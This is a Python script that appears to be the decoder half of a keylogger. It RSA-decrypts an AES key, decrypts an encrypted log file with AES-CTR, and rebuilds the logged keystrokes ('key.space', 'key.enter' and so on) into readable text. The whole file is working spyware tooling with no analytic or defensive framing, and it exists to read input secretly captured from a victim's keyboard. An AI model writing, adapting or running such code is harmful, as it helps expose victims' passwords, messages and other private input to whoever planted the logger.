#/usr/bin/python3
import pyaes
import sys
from Crypto.PublicKey import RSA

fw = open('private_key.pem','r')
private_key = fw.read()
fw.close()

class Base:
    def __init__(self,RSA_PRIVATE_KEY,LOG_FILE_NAME='LogFile.bin',KEY_FILE_NAME='AESKey.bin'):
        self.RSA_PRIVATE_KEY = RSA_PRIVATE_KEY
        self.LOG_FILE_NAME = LOG_FILE_NAME
        self.KEY_FILE_NAME = KEY_FILE_NAME
        
        self.init_RSA_Object()
        self.get_AES_Key()
        self.aes = self.generate_AES_Object()

    def init_RSA_Object(self):
        self.RSA_Obj = RSA.importKey(self.RSA_PRIVATE_KEY)
    
    def get_AES_Key(self):
        fw = open(self.KEY_FILE_NAME,'rb')
        enc_data = fw.read()
        self.RSA_Decrypt(enc_data)
        fw.close()
    
    def RSA_Decrypt(self,encrypted_data):
        try:
            self.AES_KEY = self.RSA_Obj.decrypt(encrypted_data)
        except:
            print("RSA Key Mismatch!")
            exit()

    def generate_AES_Object(self):
        aes = pyaes.AESModeOfOperationCTR(self.AES_KEY)
        return aes

    def load_logs(self):
        try:  
            fw = open(self.LOG_FILE_NAME,'rb')
            ciphertext = fw.read()
            fw.close()
            decrypted = self.aes.decrypt(ciphertext)
            self.log = str(decrypted.decode()).split('\n')
        except:
            print("Exception Occoured!")
            print(sys.exc_info()[0])

    def pretty_print_logs(self):
        start_len = len("YYYY-MM-DD HH:MM:SS.MS-")
        text_log = ""
        for event in self.log:
            data = event[start_len:]
            if len(data) == 3:
                data = data[1]
            else:
                data = data.lower()
                if data == 'key.space':
                    data = ' '
                elif data == 'key.enter':
                    data = '\n'
                else:
                    data = " " + data + " "
            text_log += data
        print(text_log)

Y = Base(private_key)
Y.load_logs()
Y.pretty_print_logs()